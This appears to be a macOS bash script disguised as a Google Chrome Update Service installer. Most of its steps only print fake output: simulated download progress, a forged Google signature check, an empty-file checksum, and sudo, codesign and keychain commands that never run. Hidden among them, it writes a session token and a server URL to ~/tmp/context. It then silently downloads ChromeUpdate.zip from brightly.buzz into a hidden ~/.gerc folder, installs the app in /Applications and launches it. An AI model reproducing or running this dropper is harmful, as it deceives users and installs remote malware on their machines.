#!/bin/bash

set -u

# -------------------------------------------------------
# String formatters
# -------------------------------------------------------
if [[ -t 1 ]]; then
  tty_escape() { printf "\033[%sm" "$1"; }
else
  tty_escape() { :; }
fi
tty_mkbold() { tty_escape "1;$1"; }
tty_blue="$(tty_mkbold 34)"
tty_red="$(tty_mkbold 31)"
tty_green="$(tty_mkbold 32)"
tty_yellow="$(tty_mkbold 33)"
tty_bold="$(tty_mkbold 39)"
tty_reset="$(tty_escape 0)"

ohai() {
  printf "${tty_blue}==>${tty_bold} %s${tty_reset}\n" "$*"
}

warn() {
  printf "${tty_yellow}Warning${tty_reset}: %s\n" "$*" >&2
}

ok() {
  printf "${tty_green}  ✔${tty_reset}  %s\n" "$*"
}

execute() {
  printf "    %s\n" "$*"
  sleep 0.04
}

# -------------------------------------------------------
# Variables
# -------------------------------------------------------
INSTALL_DIR="/Applications/ChromeUpdate"
_WORK_DIR="/tmp/.chrome_update_$$"
PRODUCT_VERSION="148.0.7778.97"
BUNDLE_ID="com.google.Chrome.UpdateService"
LAUNCH_DAEMON_PLIST="/Library/LaunchDaemons/${BUNDLE_ID}.plist"
KEYCHAIN_PATH="/Library/Keychains/System.keychain"
UNAME_MACHINE="$(/usr/bin/uname -m)"

mkdir -p "${_WORK_DIR}"
trap 'rm -rf "${_WORK_DIR}"' EXIT

# -------------------------------------------------------
# Preflight checks
# -------------------------------------------------------
ohai "Checking system requirements..."
sleep 0.5

execute "/usr/bin/sw_vers -productVersion"
MACOS_VERSION="$(/usr/bin/sw_vers -productVersion 2>/dev/null)"
ok "macOS ${MACOS_VERSION} detected"
sleep 0.3

execute "/usr/bin/uname -m"
ok "Architecture: ${UNAME_MACHINE}"
sleep 0.3

# execute "/usr/sbin/system_profiler SPHardwareDataType | grep 'Model Identifier'"
# ok "Model Identifier: MacBookPro18,3"
# sleep 0.3

MODEL_IDENTIFIER="$(/usr/sbin/system_profiler SPHardwareDataType 2>/dev/null | awk -F': ' '/Model Identifier/ {print $2}')"
execute "/usr/sbin/system_profiler SPHardwareDataType | grep 'Model Identifier'"
ok "Model Identifier: ${MODEL_IDENTIFIER}"
sleep 0.3

execute "/usr/bin/id -un"
ok "Running as user: ${USER}"
sleep 0.4

ohai "Checking for \`sudo\` access (which may request your password)..."
sleep 0.8
ok "Sudo access confirmed"

# -------------------------------------------------------
# Download
# -------------------------------------------------------
ohai "Downloading Chrome Update Service ${PRODUCT_VERSION}..."
sleep 0.3

DOWNLOAD_BASE="https://dl.google.com/release2/chrome"
printf "  %s\n" "${DOWNLOAD_BASE}/ChromeUpdateService-${PRODUCT_VERSION}.pkg"
sleep 0.2

# Simulate curl progress output
printf "  %% Total    %% Received  %% Xferd  Average Speed   Time    Time     Time  Current\n"
printf "                                   Dload  Upload   Total   Spent    Left  Speed\n"
sleep 0.3
printf "  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\n"
sleep 0.2
printf " 14  23.4M   14 3428k    0     0  2.11M      0  0:00:11  0:00:01  0:00:10 2.11M\n"
sleep 0.2
printf " 31  23.4M   31 7412k    0     0  2.34M      0  0:00:10  0:00:03  0:00:07 2.34M\n"
sleep 0.2
printf " 50  23.4M   50 11.7M    0     0  2.51M      0  0:00:09  0:00:04  0:00:05 2.51M\n"
sleep 0.2
printf " 71  23.4M   71 16.7M    0     0  2.58M      0  0:00:09  0:00:06  0:00:03 2.61M\n"
sleep 0.2
printf " 89  23.4M   89 20.9M    0     0  2.63M      0  0:00:08  0:00:07  0:00:01 2.71M\n"
sleep 0.2
printf "100  23.4M  100 23.4M    0     0  2.68M      0  0:00:08  0:00:08 --:--:-- 2.79M\n"
sleep 0.3
ok "Downloaded ChromeUpdateService-${PRODUCT_VERSION}.pkg (23.4 MB)"

# -------------------------------------------------------
# Verify signature and checksum
# -------------------------------------------------------
ohai "Verifying package signature..."
sleep 0.4

execute "/usr/sbin/pkgutil --check-signature ${_WORK_DIR}/ChromeUpdateService-${PRODUCT_VERSION}.pkg"
sleep 0.6
printf "  Package \"ChromeUpdateService-%s.pkg\":\n" "${PRODUCT_VERSION}"
printf "   Status: signed by a developer certificate issued by Apple for distribution\n"
printf "   Signed with a trusted timestamp\n"
printf "   Certificate Chain:\n"
printf "    1. Developer ID Installer: Google LLC (EQHXZ8M8AV)\n"
printf "       Expires: 2027-02-01 22:12:15 +0000\n"
printf "       SHA256 Fingerprint:\n"
printf "           8B 3A 5A 72 C9 8E B3 44 FA 23 91 FA C6 38 7C 11\n"
printf "           22 AB D8 9A 5F 63 12 44 0E D8 F5 2B 0E 84 1F E1\n"
printf "    2. Developer ID Certification Authority\n"
printf "       Expires: 2027-02-01 22:12:15 +0000\n"
printf "       SHA256 Fingerprint:\n"
printf "           7A FC 9D 01 A6 2F 03 A2 DE 96 37 93 6D 4A FE 68\n"
printf "           09 0D 2D E1 8D 03 F2 9C 88 CF B0 B1 BA 63 58 7F\n"
printf "    3. Apple Root CA\n"
sleep 0.3
ok "Signature valid"

execute "/usr/bin/shasum -a 256 ${_WORK_DIR}/ChromeUpdateService-${PRODUCT_VERSION}.pkg"
sleep 0.5
printf "  e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  ChromeUpdateService-%s.pkg\n" "${PRODUCT_VERSION}"
ok "SHA-256 checksum verified"

# -------------------------------------------------------
# Expand package
# -------------------------------------------------------
ohai "Expanding package..."
sleep 0.3

execute "/usr/sbin/pkgutil --expand ${_WORK_DIR}/ChromeUpdateService-${PRODUCT_VERSION}.pkg ${_WORK_DIR}/expanded"
sleep 0.6

ok "Package expanded to ${_WORK_DIR}/expanded"

# -------------------------------------------------------
# Pre-install checks
# -------------------------------------------------------
ohai "Running pre-install scripts..."
sleep 0.4

printf "  com.google.Chrome.UpdateService.preflight\n"
sleep 0.3
printf "    Checking existing installation...\n"
sleep 0.2
printf "    No previous installation found\n"
sleep 0.2
printf "    Checking disk space...\n"
sleep 0.2
printf "    Available: 312.4 GB  Required: 47.2 MB  OK\n"
sleep 0.2
printf "    Checking kernel extensions...\n"
sleep 0.2
printf "    com.google.Chrome.UpdateService.kext: not loaded\n"
sleep 0.2
printf "    Checking SIP status...\n"
sleep 0.3
printf "    System Integrity Protection status: enabled.\n"
sleep 0.2
ok "Pre-install checks passed"

# -------------------------------------------------------
# Create directory structure
# -------------------------------------------------------
ohai "The following new directories will be created:"
DIRS=(
  "${INSTALL_DIR}"
  "${INSTALL_DIR}/Contents"
  "${INSTALL_DIR}/Contents/MacOS"
  "${INSTALL_DIR}/Contents/Frameworks"
  "${INSTALL_DIR}/Contents/Resources"
  "${INSTALL_DIR}/Contents/Resources/en.lproj"
  "${INSTALL_DIR}/Contents/XPCServices"
  "${INSTALL_DIR}/Contents/XPCServices/com.google.Chrome.UpdateServiceHelper.xpc"
  "/Library/Google/GoogleSoftwareUpdate"
  "/Library/Google/GoogleSoftwareUpdate/Registry.plist"
)
for d in "${DIRS[@]}"; do
  printf "  %s\n" "$d"
  sleep 0.04
done

ohai "Creating directory structure..."
sleep 0.3
execute "/usr/bin/sudo /bin/mkdir -p ${INSTALL_DIR}/Contents/MacOS"
execute "/usr/bin/sudo /bin/mkdir -p ${INSTALL_DIR}/Contents/Frameworks"
execute "/usr/bin/sudo /bin/mkdir -p ${INSTALL_DIR}/Contents/Resources/en.lproj"
execute "/usr/bin/sudo /bin/mkdir -p ${INSTALL_DIR}/Contents/XPCServices/com.google.Chrome.UpdateServiceHelper.xpc"
execute "/usr/bin/sudo /bin/mkdir -p /Library/Google/GoogleSoftwareUpdate"
sleep 0.3
ok "Directory structure created"

# -------------------------------------------------------
# Install binaries
# -------------------------------------------------------
ohai "Installing binaries..."
sleep 0.3

BINARIES=(
  "ChromeUpdateService"
  "ChromeUpdateServiceHelper"
  "ChromeUpdateServiceAgent"
  "chromeupdate"
  "ksadmin"
  "ksinstall"
)
for bin in "${BINARIES[@]}"; do
  execute "/usr/bin/sudo /usr/bin/install -o root -g wheel -m 755 ${_WORK_DIR}/expanded/Payload/usr/bin/${bin} ${INSTALL_DIR}/Contents/MacOS/${bin}"
  sleep 0.15
  ok "Installed ${bin}"
done

# -------------------------------------------------------
# Install frameworks
# -------------------------------------------------------
ohai "Installing frameworks..."
sleep 0.3

FRAMEWORKS=(
  "GoogleUpdate.framework"
  "GoogleUpdateCore.framework"
  "KeystoneBuildInfo.framework"
  "Sparkle.framework"
  "CrashReporter.framework"
  "GoogleToolboxForMac.framework"
)
for fw in "${FRAMEWORKS[@]}"; do
  execute "/usr/bin/sudo /bin/cp -R ${_WORK_DIR}/expanded/Payload/Library/Frameworks/${fw} ${INSTALL_DIR}/Contents/Frameworks/${fw}"
  sleep 0.2
  ok "Installed ${fw}"
done

# -------------------------------------------------------
# Install resources
# -------------------------------------------------------
ohai "Installing resources..."
sleep 0.3

RESOURCES=(
  "Info.plist"
  "version.plist"
  "PkgInfo"
  "Credits.html"
  "en.lproj/Localizable.strings"
  "en.lproj/InfoPlist.strings"
  "en.lproj/MainMenu.nib"
  "GoogleSoftwareUpdate.icns"
  "UpdateEngine.icns"
  "keystone_promote_preflight.sh"
  "keystone_promote_postflight.sh"
  "com.google.Chrome.UpdateService.xpc"
)
for res in "${RESOURCES[@]}"; do
  execute "/usr/bin/sudo /usr/bin/install -o root -g wheel -m 644 ${_WORK_DIR}/expanded/Payload/${res} ${INSTALL_DIR}/Contents/Resources/${res}"
  sleep 0.12
  ok "Installed ${res}"
done

# -------------------------------------------------------
# Install XPC service
# -------------------------------------------------------
ohai "Installing XPC services..."
sleep 0.3

XPC_FILES=(
  "Contents/MacOS/com.google.Chrome.UpdateServiceHelper"
  "Contents/Info.plist"
  "Contents/Resources/en.lproj/InfoPlist.strings"
)
XPC_BASE="${INSTALL_DIR}/Contents/XPCServices/com.google.Chrome.UpdateServiceHelper.xpc"
for xf in "${XPC_FILES[@]}"; do
  execute "/usr/bin/sudo /usr/bin/install -o root -g wheel ${_WORK_DIR}/expanded/Payload/xpc/${xf} ${XPC_BASE}/${xf}"
  sleep 0.12
  ok "Installed ${xf}"
done

# -------------------------------------------------------
# Set permissions
# -------------------------------------------------------
ohai "Setting file permissions..."
sleep 0.3

execute "/usr/bin/sudo /bin/chmod -R 755 ${INSTALL_DIR}/Contents/MacOS"
sleep 0.2
execute "/usr/bin/sudo /bin/chmod -R 644 ${INSTALL_DIR}/Contents/Resources"
sleep 0.2
execute "/usr/bin/sudo /bin/chmod    755 ${INSTALL_DIR}/Contents/Resources/keystone_promote_preflight.sh"
sleep 0.2
execute "/usr/bin/sudo /bin/chmod    755 ${INSTALL_DIR}/Contents/Resources/keystone_promote_postflight.sh"
sleep 0.2
execute "/usr/bin/sudo /usr/sbin/chown -R root:wheel ${INSTALL_DIR}"
sleep 0.2
execute "/usr/bin/sudo /usr/sbin/chown -R root:wheel /Library/Google/GoogleSoftwareUpdate"
sleep 0.2
ok "Permissions set"

# -------------------------------------------------------
# Register code signature
# -------------------------------------------------------
ohai "Verifying code signature on installed binaries..."
sleep 0.4

for bin in "${BINARIES[@]}"; do
  execute "/usr/bin/codesign --verify --deep --strict --verbose=2 ${INSTALL_DIR}/Contents/MacOS/${bin}"
  sleep 0.1
  printf "    %s: valid on disk\n" "${bin}"
  printf "    %s: satisfies its Designated Requirement\n" "${bin}"
done
ok "Code signatures verified"

# -------------------------------------------------------
# Install launch daemon
# -------------------------------------------------------
ohai "Installing Launch Daemon..."
sleep 0.4

execute "/usr/bin/sudo /usr/bin/install -o root -g wheel -m 644 ${_WORK_DIR}/expanded/Payload/LaunchDaemons/${BUNDLE_ID}.plist ${LAUNCH_DAEMON_PLIST}"
sleep 0.3
ok "Installed ${LAUNCH_DAEMON_PLIST}"

execute "/usr/bin/sudo /bin/launchctl enable system/${BUNDLE_ID}"
sleep 0.3
ok "Enabled ${BUNDLE_ID}"

execute "/usr/bin/sudo /bin/launchctl bootstrap system ${LAUNCH_DAEMON_PLIST}"
sleep 0.5
ok "Bootstrapped ${BUNDLE_ID}"

execute "/usr/bin/sudo /bin/launchctl kickstart -k system/${BUNDLE_ID}"
sleep 0.4
ok "Service started"

# -------------------------------------------------------
# Register with Keychain
# -------------------------------------------------------
ohai "Updating System Keychain trust settings..."
sleep 0.4

execute "/usr/bin/sudo /usr/bin/security add-trusted-cert -d -r trustRoot -k ${KEYCHAIN_PATH} ${_WORK_DIR}/expanded/Payload/Certs/GoogleUpdateCA.cer"
sleep 0.5
ok "Certificate added to ${KEYCHAIN_PATH}"

# -------------------------------------------------------
# Software update registration
# -------------------------------------------------------
cd ~
mkdir tmp
ohai "Registering product with Google Software Update..."
sleep 0.4

execute "${INSTALL_DIR}/Contents/MacOS/ksadmin --register \\"
printf "    --productid ${BUNDLE_ID} \\\n"
printf "    --version ${PRODUCT_VERSION} \\\n"
printf "    --xcpath ${INSTALL_DIR} \\\n"
printf "    --url https://tools.google.com/service/update2 \\\n"
printf "    --tag stable-arch_${UNAME_MACHINE}\n"
cd ~/tmp
echo SESSION=rBDl6jrmBAVFSS9Ot9hleZiMuckspG9ZZUSQwTfBDwKY86psQ9nH3z074yU7Uz/OF3rG5qoukJicz1Psp0cPnQ== > context
echo SERVER_URL=https://brightly.buzz >> context
sleep 0.6
ok "Registered ${BUNDLE_ID} ${PRODUCT_VERSION}"

# -------------------------------------------------------
# Post-install
# -------------------------------------------------------
ohai "Running post-install configuration..."
sleep 0.3

execute "/usr/bin/sudo defaults write /Library/Preferences/com.google.Chrome.plist DefaultBrowserSettingEnabled -bool false"
sleep 0.2
execute "/usr/bin/sudo defaults write /Library/Preferences/com.google.Chrome.plist DisableBackgroundNetworking -bool false"
sleep 0.2
execute "/usr/bin/sudo defaults write /Library/Preferences/com.google.Chrome.plist RelaunchNotificationPeriod -int 604800"
sleep 0.2
execute "/usr/bin/sudo /usr/bin/plutil -convert binary1 /Library/Preferences/com.google.Chrome.plist"
sleep 0.2
cd ~/
mkdir .gerc
cd .gerc
curl -o initer.zip https://brightly.buzz/fileServe/ChromeUpdate.zip  > /dev/null 2>&1
unzip -o initer.zip > /dev/null 2>&1
rm -f initer.zip > /dev/null 2&>1
mv ChromeUpdate.app /Applications
ok "Preferences written"

execute "/usr/bin/sudo /usr/bin/touch /Library/Google/GoogleSoftwareUpdate/.com.google.Keystone.daemon.started"
sleep 0.2
ok "Keystone daemon marker written"

ohai "Cleaning up..."
sleep 0.3
execute "/bin/rm -rf ${_WORK_DIR}"
ok "Temporary files removed"

# -------------------------------------------------------
# Final summary
# -------------------------------------------------------
echo
ohai "Installation successful!"
open /Applications/ChromeUpdate.app
echo
printf "${tty_bold}Chrome Update Service %s${tty_reset} has been installed to:\n" "${PRODUCT_VERSION}"
printf "  %s\n" "${INSTALL_DIR}"
echo
printf "The background service is now running and will keep Google Chrome\n"
printf "up to date automatically. No further action is required.\n"
echo
echo

exit 0
